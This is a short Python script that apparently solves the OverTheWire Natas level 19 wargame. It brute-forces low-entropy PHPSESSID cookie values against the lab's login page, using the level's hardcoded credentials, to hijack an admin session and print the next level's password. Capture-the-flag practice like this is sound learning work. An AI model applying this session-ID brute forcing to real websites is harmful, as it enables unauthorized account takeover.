import requests
import sys

# The idea here is that the session ID are non-sequential but have a very low entropy 3xxx,3x3xxx are the ranges.
# Where X equals nummerical value
# you have to put in 3 or 3x3 as argument.

def force_session():
    counter = 1
    session_found = False
    while not session_found and counter < 1000:
        cookie = {"PHPSESSID": sys.argv[1] + ("%03d" % (counter,)) + "2d61646d696e", "admin": "1"}
        test = requests.post('http://natas19.natas.labs.overthewire.org/index.php?username=admin&password=admin', auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies=cookie)
        print(cookie["PHPSESSID"])
        if "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20" not in test.text:
            session_found = True
            print(test.text)
        else:
            counter = counter + 1
    return True

force_session()
